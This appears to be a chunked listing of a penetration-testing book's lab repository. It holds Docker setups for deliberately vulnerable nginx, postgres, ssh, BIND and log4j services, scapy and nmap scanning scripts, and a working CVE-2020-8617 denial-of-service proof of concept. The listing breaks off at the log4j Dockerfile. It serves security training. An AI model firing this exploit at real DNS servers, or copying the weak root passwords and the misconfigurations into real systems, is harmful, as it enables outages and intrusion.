@@ -1,0 +1,751 @@
+[
+  {
+    "step": 1,
+    "path": "containers/compose.yaml",
+    "start": 1,
+    "end": 14,
+    "code": "services:\n  bind:\n    build:\n      context: .\n      dockerfile: ./bind/Dockerfile\n    container_name: pentest-book-bind\n    tty: true\n    cap_add:\n      - ALL\n    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.2\n    mac_address: 02:42:0a:08:09:02\n    ports:\n"
+  },
+  {
+    "step": 2,
+    "path": "containers/compose.yaml",
+    "start": 15,
+    "end": 25,
+    "code": "      - \"127.0.0.1:53:53\"\n      - \"127.0.0.1:53:53/udp\"\n\n  nginx:\n    build:\n      context: .\n      dockerfile: ./nginx/Dockerfile\n    container_name: pentest-book-nginx\n    tty: true\n    cap_add:\n      - ALL\n"
+  },
+  {
+    "step": 3,
+    "path": "containers/pentester/Dockerfile",
+    "start": 1,
+    "end": 14,
+    "code": "FROM ubuntu:22.04\nARG DEBIAN_FRONTEND=noninteractive\nENV TZ=Asia/Tokyo\nENV LANG C.UTF-8\nENV LANGUAGE en_US\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n\n# Install necessary packages\nRUN apt-get update && apt-get upgrade -y \\\n\t&& apt-get install -y software-properties-common && add-apt-repository ppa:deadsnakes/ppa \\\n\t&& apt-get install -y clamav clamav-daemon curl sudo dnsutils iproute2 iptables iputils-ping \\\n\tlibssl-dev net-tools tcpdump nmap nasm python3.11 golang gcc git emacs nano vim ssh \\\n\t&& rm -rf /var/lib/apt/lists/*\n\n"
+  },
+  {
+    "step": 4,
+    "path": "containers/pentester/Dockerfile",
+    "start": 15,
+    "end": 18,
+    "code": "# For Chapter02\nRUN curl -sS https://bootstrap.pypa.io/get-pip.py | python3.11\nRUN pip3 install cffi scapy cryptography ipython\n\n"
+  },
+  {
+    "step": 5,
+    "path": "containers/compose.yaml",
+    "start": 26,
+    "end": 39,
+    "code": "    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.3\n    mac_address: 02:42:0a:08:09:03\n    ports:\n      - \"127.0.0.1:80:80\"\n\n  postgres:\n    build: \n      context: .\n      dockerfile: ./postgres/Dockerfile\n    container_name: pentest-book-postgres\n    tty: true\n    cap_add:\n"
+  },
+  {
+    "step": 6,
+    "path": "containers/compose.yaml",
+    "start": 40,
+    "end": 47,
+    "code": "      - ALL\n    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.4\n    mac_address: 02:42:0a:08:09:04\n    ports:\n      - \"127.0.0.1:5432:5432\"\n\n"
+  },
+  {
+    "step": 7,
+    "path": "containers/compose.yaml",
+    "start": 48,
+    "end": 60,
+    "code": "  ssh:\n    build: \n      context: .\n      dockerfile: ./ssh/Dockerfile\n    container_name: pentest-book-ssh\n    tty: true\n    cap_add:\n      - ALL\n    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.5\n    mac_address: 02:42:0a:08:09:05\n    ports:\n"
+  },
+  {
+    "step": 8,
+    "path": "containers/pentester/Dockerfile",
+    "start": 19,
+    "end": 28,
+    "code": "# For Chapter05\n# Also required for gem install\nRUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\\n    chmod 755 msfinstall && \\\n    ./msfinstall\nENV PATH $PATH:/opt/metasploit-framework/embedded/bin\n\n# For Chapter03\nRUN gem install ruby-nmap\n\n"
+  },
+  {
+    "step": 9,
+    "path": "containers/pentester/Dockerfile",
+    "start": 29,
+    "end": 37,
+    "code": "RUN useradd -m -s /bin/bash pentester \\\n    && usermod -aG sudo pentester \\\n    && echo \"root:pentest\" | chpasswd \\\n    && echo \"pentester:pentest\" | chpasswd\n\nRUN echo \"alias sudo='sudo '\" >> ~/.bashrc\nRUN echo \"alias python='python3.11'\" >> ~/.bashrc\nRUN cp /root/.bashrc /home/pentester/.bashrc\n\n"
+  },
+  {
+    "step": 10,
+    "path": "containers/compose.yaml",
+    "start": 61,
+    "end": 74,
+    "code": "      - \"127.0.0.1:22:22\"\n  \n  log4j:\n    build:\n      context: .\n      dockerfile: ./log4j/Dockerfile\n    container_name: pentest-book-log4j\n    tty: true\n    cap_add:\n      - ALL\n    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.6\n    mac_address: 02:42:0a:08:09:06\n"
+  },
+  {
+    "step": 11,
+    "path": "containers/compose.yaml",
+    "start": 75,
+    "end": 88,
+    "code": "    ports:\n      - \"127.0.0.1:8080:8080\"\n\n  pentester:\n    build:\n      context: .\n      dockerfile: ./pentester/Dockerfile\n    container_name: pentest-book-pentester\n    tty: true\n    cap_add:\n      - ALL\n    networks:\n      net-10.8.9.0:\n        ipv4_address: 10.8.9.7\n"
+  },
+  {
+    "step": 12,
+    "path": "containers/compose.yaml",
+    "start": 89,
+    "end": 98,
+    "code": "    mac_address: 02:42:0a:08:09:07\n    privileged: true\n\nnetworks:\n  net-10.8.9.0:\n    name: net-10.8.9.0\n    ipam:\n      config:\n        - subnet: 10.8.9.0/24\n          gateway: 10.8.9.1"
+  },
+  {
+    "step": 13,
+    "path": "containers/pentester/Dockerfile",
+    "start": 38,
+    "end": 49,
+    "code": "# For Chapter05\nRUN /etc/init.d/clamav-freshclam start\nRUN /etc/init.d/clamav-daemon start\n\n# For Chapter06\nRUN echo \"\" >> /home/pentester/.vimrc\nRUN mkdir -p /home/pentester/.vim/plugin\nRUN mkdir /home/pentester/.ssh\n\nCOPY ./pentester/code /home/pentester/code\nRUN chown -R pentester /home/pentester\n\n"
+  },
+  {
+    "step": 14,
+    "path": "containers/pentester/Dockerfile",
+    "start": 50,
+    "end": 53,
+    "code": "USER pentester\nWORKDIR /home/pentester\n\nRUN git clone --depth 1 https://github.com/danielmiessler/SecLists.git /home/pentester/SecLists\n"
+  },
+  {
+    "step": 15,
+    "path": "code/exec-pentester-bash.sh",
+    "start": 1,
+    "end": 3,
+    "code": "#!/bin/sh\n\ndocker exec -it pentest-book-pentester /bin/bash\n"
+  },
+  {
+    "step": 16,
+    "path": "code/chapter02/tcp-connect-scan-by-socket.py",
+    "start": 1,
+    "end": 10,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport socket\nimport sys\n\ntarget_ip = sys.argv[1]\ntarget_port = int(sys.argv[2])\n\ns = socket.socket()\n"
+  },
+  {
+    "step": 17,
+    "path": "code/chapter02/tcp-syn-scan.py",
+    "start": 1,
+    "end": 11,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport sys\nfrom scapy.all import IP, TCP, sr1\n\ntarget_ip = sys.argv[1]\ntarget_port = int(sys.argv[2])\n\n# SYNパケットを作成する\nsyn_packet = IP(dst=target_ip)/TCP(dport=target_port, flags=\"S\")\n"
+  },
+  {
+    "step": 18,
+    "path": "code/chapter02/tcp-connect-scan-by-socket.py",
+    "start": 11,
+    "end": 17,
+    "code": "errno = s.connect_ex((target_ip, target_port))\ns.close()\n\nif errno == 0:\n    print(f\"TCP port {target_port} is open\")\nelse:\n    print(f\"TCP port {target_port} is closed\")"
+  },
+  {
+    "step": 19,
+    "path": "code/chapter02/tcp-syn-scan.py",
+    "start": 12,
+    "end": 21,
+    "code": "\n# パケットを送信し、レスポンスを取得する\nresponse_packet = sr1(syn_packet)\n\n# SYN/ACKパケットが返ってきた場合は、ポートが開いていると判断\nif (response_packet.haslayer(TCP) and \n    response_packet[TCP].flags == \"SA\"):\n    print(f\"TCP port {target_port} is open\")\nelse:\n    print(f\"TCP port {target_port} is closed\")"
+  },
+  {
+    "step": 20,
+    "path": "code/chapter02/tcp-connect-scan-v1.py",
+    "start": 1,
+    "end": 11,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport sys\nfrom scapy.all import IP, TCP, sr1\n\ntarget_ip = sys.argv[1]\ntarget_port = int(sys.argv[2])\n\nip_layer = IP(dst=target_ip)\n\n"
+  },
+  {
+    "step": 21,
+    "path": "code/chapter02/tcp-connect-scan-v1.py",
+    "start": 12,
+    "end": 21,
+    "code": "# SYNパケットを作成する\nsyn_packet = ip_layer/TCP(dport=target_port, flags='S')\n\n# SYNパケットを送信し、レスポンスを取得する\nprint('Send SYN packet:')\nresponse_packet = sr1(syn_packet)\nprint(f'Response: {response_packet}')\nprint('-----------------------------------')\n\n# SYN/ACKパケットが返ってきた場合、ACKパケットを送信する\n"
+  },
+  {
+    "step": 22,
+    "path": "code/chapter02/sniff-icmp.py",
+    "start": 1,
+    "end": 10,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nfrom scapy.all import sniff\n\n# sniff関数の引数に指定するコールバック関数\ndef print_packet(packet):\n    packet.show()\n\nsniff(filter='icmp', prn=print_packet, count=5)\n"
+  },
+  {
+    "step": 23,
+    "path": "code/chapter02/tcp-connect-scan-v1.py",
+    "start": 22,
+    "end": 33,
+    "code": "if (response_packet.haslayer(TCP) and\n    response_packet[TCP].flags == 'SA'):\n    tcp_layer = TCP(dport=target_port, flags='A',\n                    ack=response_packet.seq + 1,\n                    seq=response_packet.ack)\n    ack_packet = ip_layer/tcp_layer\n    print('Send ACK packet:')\n    response_after_handshake = sr1(ack_packet, timeout=3)\n    print(f'Response: {response_after_handshake}')\n    print('-----------------------------------')\n    print(f'TCP port {target_port} is open')\n\n"
+  },
+  {
+    "step": 24,
+    "path": "code/chapter02/tcp-connect-scan-v1.py",
+    "start": 34,
+    "end": 36,
+    "code": "# RSTパケットが返ってきた場合、ポートは閉じていると判断する\nelse:\n    print(f'TCP port {target_port} is closed')\n"
+  },
+  {
+    "step": 25,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 1,
+    "end": 11,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport sys\nimport time\n\nfrom scapy.all import IP, TCP, sr1\n\ntarget_ip = sys.argv[1]\ntarget_port = int(sys.argv[2])\n\n"
+  },
+  {
+    "step": 26,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 12,
+    "end": 22,
+    "code": "ip_layer = IP(dst=target_ip)\n\n# SYNパケットを作成する\nsyn_packet = ip_layer/TCP(dport=target_port, flags='S')\n\n# SYNパケットを送信し、レスポンスを取得する\nprint('Send SYN packet:')\nresponse_packet = sr1(syn_packet)\nprint(f'Response: {response_packet}')\nprint('-----------------------------------')\n\n"
+  },
+  {
+    "step": 27,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 23,
+    "end": 34,
+    "code": "# SYN/ACKパケットが返ってきた場合、ACKパケットを送信する\nif (response_packet.haslayer(TCP) and \n    response_packet[TCP].flags == 'SA'):\n    ack_tcp_layer = TCP(dport=target_port, flags='A',\n                        ack=response_packet.seq + 1,\n                        seq=response_packet.ack)\n    ack_packet = ip_layer/ack_tcp_layer\n    print('Send ACK packet:')\n    sr1(ack_packet, timeout=3)\n    print('-----------------------------------')\n    print(f'TCP port {target_port} is open')\n\n"
+  },
+  {
+    "step": 28,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 35,
+    "end": 43,
+    "code": "    # 接続を終了するためにFINパケットを送信する\n    print('Send FIN packet:')\n    fin_tcp_layer = TCP(dport=target_port, flags='FA',\n                        ack=response_packet.seq + 1,\n                        seq=response_packet.ack)\n    fin_packet = ip_layer/fin_tcp_layer\n    response_fin_packet = sr1(fin_packet, timeout=3)\n    print(f'Response: {response_fin_packet}')\n\n"
+  },
+  {
+    "step": 29,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 44,
+    "end": 57,
+    "code": "    # FINパケットが返ってきた場合、ACKパケットを送信する\n    if (response_fin_packet.haslayer(TCP) and\n        response_fin_packet[TCP].flags == 'FA'):\n        print('Send ACK packet:')\n        ack_after_fin_tcp_layer = TCP(\n            dport=target_port, flags='A',\n            ack=response_fin_packet.seq + 1,\n            seq=response_fin_packet.ack\n        )\n        ack_packet_after_fin = ip_layer/ack_after_fin_tcp_layer\n        sr1(ack_packet_after_fin, timeout=3)\n        print('Connection closed')\n    else:\n        print('Failed to close connection')\n"
+  },
+  {
+    "step": 30,
+    "path": "code/chapter02/tcp-connect-scan-v2.py",
+    "start": 58,
+    "end": 61,
+    "code": "\n# RSTパケットが返ってきた場合、ポートは閉じていると判断する\nelse:\n    print(f'TCP port {target_port} is closed')\n"
+  },
+  {
+    "step": 31,
+    "path": "containers/pentester/code/chapter03/target-hosts.txt",
+    "start": 1,
+    "end": 1,
+    "code": "10.8.9.0/24"
+  },
+  {
+    "step": 32,
+    "path": "containers/pentester/code/chapter03/exclude-hosts.txt",
+    "start": 1,
+    "end": 1,
+    "code": "10.8.9.7"
+  },
+  {
+    "step": 33,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 1,
+    "end": 9,
+    "code": "#!/bin/sh\nset -eu\n\n# ヘルプメッセージを定義\nusage() {\n  echo \"Usage: ${0##*/} -T<0-5> \\\n<target-hosts.txt> <exclude-hosts.txt>\"\n}\n\n"
+  },
+  {
+    "step": 34,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 10,
+    "end": 21,
+    "code": "# コマンドライン引数がなにも無い場合にエラーメッセージを出力する\nif [ \"$#\" -eq 0 ]; then\n  echo \"Error: Target hosts must be specified\"\n  usage\n  exit 1\nfi\n\nif [ \"$1\" = \"-h\" ]; then\n  usage\n  exit 0\nfi\n\n"
+  },
+  {
+    "step": 35,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 22,
+    "end": 30,
+    "code": "today=`date +%Y%m%d` # フォルダ名に使用するための日付を取得する\n# 結果を格納するフォルダがなければ作成する\nif [ ! -d ./results/${today} ]; then\n  mkdir -p ./results/${today}\nfi\n\n# 出力するファイル名に使用するための日時を取得する\nnow=`date +%Y%m%d_%H%M%S`\n\n"
+  },
+  {
+    "step": 36,
+    "path": "code/chapter03/nmap-xml2csv.rb",
+    "start": 1,
+    "end": 14,
+    "code": "require 'nmap/xml'\nrequire 'optparse'\n\nnmap_file = ARGV[0]\n\noutput_file = 'portscan-result.csv'\nopt = OptionParser.new\nopt.on('-o', '--output <csv file name>', 'output CSV File') do |val|\n  output_file = val\nend\nopt.on('-h', '--help', 'show help') {\n  puts opt\n  exit \n}\n"
+  },
+  {
+    "step": 37,
+    "path": "code/chapter03/nmap-xml2csv.rb",
+    "start": 15,
+    "end": 20,
+    "code": "opt.parse(ARGV)\n\nputs '[+] parse xml file:'\nputs nmap_file\nputs '-----------------------------------------------------'\n\n"
+  },
+  {
+    "step": 38,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 31,
+    "end": 43,
+    "code": "# 引数を変数に格納\ntiming_template=$1\nhosts=`cat $2`\necho \"Target: ${hosts}\"\n\nif [ \"$#\" -eq 3 ]; then\n  exclude_hosts=`cat $3`\n  echo \"Exclude Hosts: ${exclude_hosts}\"\n  exclude_option=\"--exclude ${exclude_hosts}\"\nelse\n  exclude_option=\"\"\nfi\n\n"
+  },
+  {
+    "step": 39,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 44,
+    "end": 56,
+    "code": "for h in $hosts\ndo\n  # フォルダ名に使用するためCIDR表記の/を_に置換\n  host_name=`echo $h | tr \"/\" \"_\"`\n  # TCP SYN Pingによってホストを発見し、SYNスキャンを行う\n  # 結果はXMLファイルとTXTファイルで出力する\n  # SYNスキャンで結果がうまく取れない場合、-sSを-sTに変更し、\n  # TCP Connectスキャンに切り替える\n  echo \"Now Launching: sudo nmap ${exclude_option} -v -n \\\n-p- -PS22,80,443 -sS --host-timeout 30m \\\n-oX ./results/${today}/${host_name}_syn_ping_${now}.xml \\\n-oN ./results/${today}/${host_name}_syn_ping_${now}.txt ${h}\"\n\n"
+  },
+  {
+    "step": 40,
+    "path": "code/chapter03/portscan-tcp-all.sh",
+    "start": 57,
+    "end": 61,
+    "code": "  sudo nmap ${timing_template} ${exclude_option} -v -n \\\n-p- -PS22,80,443 -sS --host-timeout 30m \\\n-oX ./results/${today}/${host_name}_syn_ping_${now}.xml \\\n-oN ./results/${today}/${host_name}_syn_ping_${now}.txt ${h}\ndone\n"
+  },
+  {
+    "step": 41,
+    "path": "code/chapter03/nmap-xml2csv.rb",
+    "start": 21,
+    "end": 34,
+    "code": "result = ''\nNmap::XML.open(nmap_file) do |xml|\n  xml.each_host do |host|\n    if host.status.to_s == 'up'\n      row = false\n      host.each_port do |port|\n        if port.state.to_s == 'open'\n          if !row\n            result += host.ip + \"\\t\"\n            row = true\n          end\n          result += \"#{port.number}(#{port.service}), \"\n        end\n      end\n"
+  },
+  {
+    "step": 42,
+    "path": "code/chapter03/nmap-xml2csv.rb",
+    "start": 35,
+    "end": 48,
+    "code": "      if result.end_with?('), ', ')')\n        result = result.slice(0...-2)\n      end\n      if row\n        result += \"\\n\"\n      end\n    end\n  end\nend\nputs result\nFile.open(output_file, 'w') do |f| \n  f.puts(result)\nend\n\n"
+  },
+  {
+    "step": 43,
+    "path": "code/chapter03/nmap-xml2csv.rb",
+    "start": 49,
+    "end": 50,
+    "code": "puts '-----------------------------------------------------'\nputs '[+] Output: ' + output_file\n"
+  },
+  {
+    "step": 44,
+    "path": "containers/nginx/Dockerfile",
+    "start": 1,
+    "end": 5,
+    "code": "FROM nginx\nRUN rm /etc/nginx/conf.d/default.conf\nCOPY nginx/vulnerable.conf /etc/nginx/conf.d/vulnerable.conf\nCOPY nginx/index.html /usr/share/nginx/html/index.html\nRUN mkdir -p /var/www/app/static\n"
+  },
+  {
+    "step": 45,
+    "path": "containers/nginx/vulnerable.conf",
+    "start": 1,
+    "end": 13,
+    "code": "server {\n    listen       80;\n    server_name  localhost;\n\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html;\n    }\n\n    location /static {\n        alias /var/www/app/static/;\n    }\n\n"
+  },
+  {
+    "step": 46,
+    "path": "containers/nginx/index.html",
+    "start": 1,
+    "end": 14,
+    "code": "<!DOCTYPE html>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>Sample Web Page</title>\n<style>\n    body {\n        width: 40em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    }\n</style>\n</head>\n<body>\n"
+  },
+  {
+    "step": 47,
+    "path": "containers/nginx/index.html",
+    "start": 15,
+    "end": 18,
+    "code": "<h1>Sample Web Page</h1>\n<a href=\"/static/welcome.txt\">welcome.txt</a></p>\n</body>\n</html>"
+  },
+  {
+    "step": 48,
+    "path": "containers/nginx/Dockerfile",
+    "start": 6,
+    "end": 8,
+    "code": "RUN echo 'Welcome!!' > /var/www/app/static/welcome.txt\nCOPY nginx/git /var/www/app/.git\nCMD [\"/usr/sbin/nginx\", \"-g\", \"daemon off;\"]\n"
+  },
+  {
+    "step": 49,
+    "path": "containers/nginx/vulnerable.conf",
+    "start": 14,
+    "end": 18,
+    "code": "    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n}\n"
+  },
+  {
+    "step": 50,
+    "path": "containers/postgres/Dockerfile",
+    "start": 1,
+    "end": 6,
+    "code": "FROM postgres:15.1\nENV POSTGRES_PASSWORD=password123\nENV POSTGRES_USER=postgres\nENV POSTGRES_INITDB_ARGS=--auth-host=md5\nRUN localedef -i ja_JP -c -f UTF-8 -A /usr/share/locale/locale.alias ja_JP.UTF-8\nENV LANG ja_JP.utf8\n"
+  },
+  {
+    "step": 51,
+    "path": "containers/postgres/sql/init.sql",
+    "start": 1,
+    "end": 9,
+    "code": "CREATE DATABASE sample;\n\n\\c sample;\n\nCREATE TABLE workers (\n  first_name text,\n  last_name text,\n  email  text\n);\n"
+  },
+  {
+    "step": 52,
+    "path": "containers/postgres/Dockerfile",
+    "start": 7,
+    "end": 8,
+    "code": "COPY postgres/sql/* /docker-entrypoint-initdb.d/\nRUN echo \"host all all 0.0.0.0/0 md5\" >> /etc/postgresql/pg_hba.conf"
+  },
+  {
+    "step": 53,
+    "path": "containers/postgres/sql/init.sql",
+    "start": 10,
+    "end": 15,
+    "code": "\nINSERT INTO workers (first_name, last_name, email) VALUES ('zouichi', 'kanoe', 'zouichi.kanoe@example.com');\nINSERT INTO workers (first_name, last_name, email) VALUES ('nagate', 'tanikaze', 'nagate.tanikaze@example.com');\nINSERT INTO workers (first_name, last_name, email) VALUES ('shizuka', 'hoshiziro', 'shizuka.hoshiziro@example.com');\nINSERT INTO workers (first_name, last_name, email) VALUES ('norio', 'kunato', 'norio.kunato@example.com');\nINSERT INTO workers (first_name, last_name, email) VALUES ('yuhata', 'midorikawa', 'yuhata.midorikawa@example.com');\n"
+  },
+  {
+    "step": 54,
+    "path": "containers/ssh/Dockerfile",
+    "start": 1,
+    "end": 14,
+    "code": "FROM ubuntu:22.04\n\nENV TZ=Asia/Tokyo\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n\n# Install necessary packages\nRUN apt-get update \\\n\t&& apt-get install -y iputils-ping net-tools openssh-server \\\n\t&& rm -rf /var/lib/apt/lists/*\n\nRUN mkdir /var/run/sshd\nRUN mkdir ~/Documents\n\nRUN echo 'example_secret' > ~/Documents/credential.txt\n"
+  },
+  {
+    "step": 55,
+    "path": "containers/ssh/Dockerfile",
+    "start": 15,
+    "end": 27,
+    "code": "RUN echo 'root:password' | chpasswd\n\n# Settings to allow password login\nRUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config\n\n# SSH login fix. Otherwise user is kicked off after login\nRUN sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd\n\nENV NOTVISIBLE \"in users profile\"\nRUN echo \"export VISIBLE=now\" >> /etc/profile\n\nEXPOSE 22\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n"
+  },
+  {
+    "step": 56,
+    "path": "containers/bind/Dockerfile",
+    "start": 1,
+    "end": 8,
+    "code": "# Forking https://github.com/knqyf263/CVE-2020-8617\nFROM centos:7\n\n# CentOS7 EOL was 2024-06-30, so mirrorlist.centos.org is unavailable now.\n# Thanks to https://zenn.dev/potyama/articles/83f1d7fc82202e\nRUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-* && \\\n    sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*\n\n"
+  },
+  {
+    "step": 57,
+    "path": "containers/bind/Dockerfile",
+    "start": 9,
+    "end": 16,
+    "code": "# Install necessary packages\nRUN yum -y update \\\n    && yum -y groupinstall \"Development Tools\" \\\n    && yum install -y epel-release \\\n    && yum -y install kernel-devel kernel-headers openssl-devel perl-Net-DNS bind-utils vim tar python-pip \\\n    && pip --trusted-host pypi.python.org --trusted-host files.pythonhosted.org --trusted-host pypi.org install argparse ply \\\n\t&& yum clean all\n\n"
+  },
+  {
+    "step": 58,
+    "path": "containers/bind/config/named",
+    "start": 1,
+    "end": 2,
+    "code": "ROOTDIR=/var/named/chroot\nOPTIONS=-4\n"
+  },
+  {
+    "step": 59,
+    "path": "containers/bind/config/named.conf",
+    "start": 1,
+    "end": 12,
+    "code": "Controls {\n        inet 127.0.0.1 \n        allow { localhost; } \n        keys { rndc-key; };\n};\n\ninclude \"/etc/rndc.key\";\n\nacl \"internal-network\" {\n        10.8.9.0/24;\n};\n\n"
+  },
+  {
+    "step": 60,
+    "path": "containers/bind/config/named.conf",
+    "start": 13,
+    "end": 21,
+    "code": "options {\n        version \"unknown\";\n        hostname \"ns1.test.example.com\";\n\n        directory \"/var/named\";\n        dump-file \"/data/cache_dump.db\";\n        statistics-file \"/data/named_status.dat\";\n        pid-file \"/var/run/named/named.pid\";\n\n"
+  },
+  {
+    "step": 61,
+    "path": "containers/bind/config/named.conf",
+    "start": 22,
+    "end": 30,
+    "code": "        listen-on port 53 {\n                internal-network;\n        };\n\n        allow-query { internal-network; };\n\n        recursion yes;\n        allow-recursion { internal-network; };\n\n"
+  },
+  {
+    "step": 62,
+    "path": "containers/bind/config/named.conf",
+    "start": 31,
+    "end": 40,
+    "code": "        notify yes;\n        max-transfer-time-in 60;\n        transfer-format many-answers;\n        transfers-in 10;\n        transfers-per-ns 2;\n        allow-transfer { none; };\n        allow-update { none; };\n\n        nxdomain-redirect signed;\n};\n"
+  },
+  {
+    "step": 63,
+    "path": "containers/bind/config/example.com.zone",
+    "start": 1,
+    "end": 14,
+    "code": "$ORIGIN example.com.\n$TTL 3600       ; 1 hour\n@ IN SOA ns1.example.com. postmaster.example.com. (\n        2015012902  ; serial\n        3600        ; refresh (1 hour)\n        1200        ; retry (20 min.)\n        1209600     ; expire (2 weeks)\n        900         ; minimum (15 min.)\n        )\n@       IN  NS      ns1.example.com.\n@       IN  NS      ns2.example.com.\n@       IN  MX      10 mail.example.com.\n@       IN  TXT     \"v=spf1 mx ~all\"    ; TXT\n@       IN  SPF     \"v=spf1 mx ~all\"    ; SPF\n"
+  },
+  {
+    "step": 64,
+    "path": "containers/bind/config/example.com.zone",
+    "start": 15,
+    "end": 20,
+    "code": "\nns1     IN  A       192.168.1.2\nns2     IN  A       192.168.1.3\nmail    IN  A       192.168.1.4\nhost1   IN  A       192.168.1.5\nwww     IN  CNAME   host1\n"
+  },
+  {
+    "step": 65,
+    "path": "containers/bind/Dockerfile",
+    "start": 17,
+    "end": 28,
+    "code": "# Install BIND9 from source\nCOPY bind/src/bind-9.12.4.tar.gz /usr/local/src/bind-9.12.4.tar.gz\nRUN cd /usr/local/src && \\\n    tar zxvf bind-9.12.4.tar.gz && \\\n    mv bind-9.12.4 bind && \\\n    rm bind-9.12.4.tar.gz\nRUN cd /usr/local/src/bind && \\\n    ./configure --enable-syscalls --prefix=/var/named/chroot --enable-threads --with-openssl=yes --enable-openssl-version-check --enable-ipv6 --disable-linux-caps && \\\n    chown -R root:root /usr/local/src/bind && \\\n    make && \\\n    make install\n\n"
+  },
+  {
+    "step": 66,
+    "path": "containers/bind/Dockerfile",
+    "start": 29,
+    "end": 40,
+    "code": "# Create device files\nRUN mkdir /var/named/chroot/dev && \\\n    mknod -m 666 /var/named/chroot/dev/null c 1 3 && \\\n    mknod -m 666 /var/named/chroot/dev/random c 1 8\n\n# Create rndc key\nRUN /var/named/chroot/sbin/rndc-confgen -a\n\nRUN mkdir /var/named/chroot/data && \\\n    mkdir /var/named/chroot/var/log && \\\n    mkdir /var/named/chroot/var/named\n\n"
+  },
+  {
+    "step": 67,
+    "path": "containers/bind/Dockerfile",
+    "start": 41,
+    "end": 52,
+    "code": "# COPY files\nCOPY bind/config/named.root /var/named/chroot/var/named/named.root\nCOPY bind/config/named.conf /var/named/chroot/etc/named.conf\nCOPY bind/config/named /etc/sysconfig/named\nCOPY bind/config/example.com.zone /var/named/chroot/var/named/example.com.zone\n\n# Create symbolic link\nRUN ln -s /var/named/chroot/etc/rndc.key /etc/rndc.key && \\\n    ln -s /var/named/chroot/etc/named.conf /etc/named.conf\n\nCMD [\"/var/named/chroot/sbin/named\", \"-g\", \"-t\", \"/var/named/chroot\", \"-c\", \"/etc/named.conf\"]\n\n"
+  },
+  {
+    "step": 68,
+    "path": "containers/bind/config/named.conf",
+    "start": 41,
+    "end": 54,
+    "code": "\nlogging {\n        channel \"log_default\"{\n                file \"/var/log/named.log\" versions 5 size 5m;\n                print-time yes;\n                severity info;\n                print-category yes;\n        };\n        channel \"alert\" {\n                file \"/var/log/alert.log\" versions 8 size 4m;\n                severity  info;\n                print-time yes;\n                print-severity yes;\n                print-category yes;\n"
+  },
+  {
+    "step": 69,
+    "path": "containers/bind/config/named.conf",
+    "start": 55,
+    "end": 63,
+    "code": "        };\n        channel \"query\" {\n                file \"/var/log/query.log\" versions 8 size 50m;\n                severity  debug;\n                print-time yes;\n                print-severity yes;\n                print-category yes;\n        };\n\n"
+  },
+  {
+    "step": 70,
+    "path": "containers/bind/config/named.conf",
+    "start": 64,
+    "end": 74,
+    "code": "        category default {\"log_default\";};\n        category security {\"alert\";};\n        category queries {\"query\";};\n        category lame-servers { null; };\n};\n\nzone \".\" IN {\n        type hint;\n        file \"named.root\";\n};\n\n"
+  },
+  {
+    "step": 71,
+    "path": "containers/bind/config/named.conf",
+    "start": 75,
+    "end": 79,
+    "code": "zone \"example.com.\" IN {\n        type master;\n        file \"example.com.zone\";\n        allow-update { none; };\n};\n"
+  },
+  {
+    "step": 72,
+    "path": "code/chapter02/CVE-2020-8617.py",
+    "start": 1,
+    "end": 12,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport sys\nfrom scapy.all import DNS, DNSQR, IP, sr1, UDP, DNSRRTSIG, DNSRROPT\n\nargs = sys.argv\n\nif len(args) == 1:\n    print('Specify the target IP address in the command line argument')\n    sys.exit()\n\n"
+  },
+  {
+    "step": 73,
+    "path": "code/chapter02/CVE-2020-8617.py",
+    "start": 13,
+    "end": 26,
+    "code": "# DNSのパケットを作成する\ntsig = DNSRRTSIG(rrname=\"local-ddns\", algo_name=\"hmac-sha256\", \n                 rclass=255, mac_len=0, mac_data=\"\", time_signed=0,\n                 fudge=300, error=16)\ndns_layer = DNS(rd=1, ad=1, \n                qd=DNSQR(qname='www.example.com'), ar=tsig)\ndns_req = IP(dst=args[1])/UDP(dport=53)/dns_layer\n\nresponse = sr1(dns_req, timeout=3)\nif response is None:\n    print('Maybe the attack is successful!')\nelse:\n    print('The attack failed...')\n    print(response)\n"
+  },
+  {
+    "step": 74,
+    "path": "containers/log4j/Dockerfile",
+    "start": 1,
+    "end": 7,
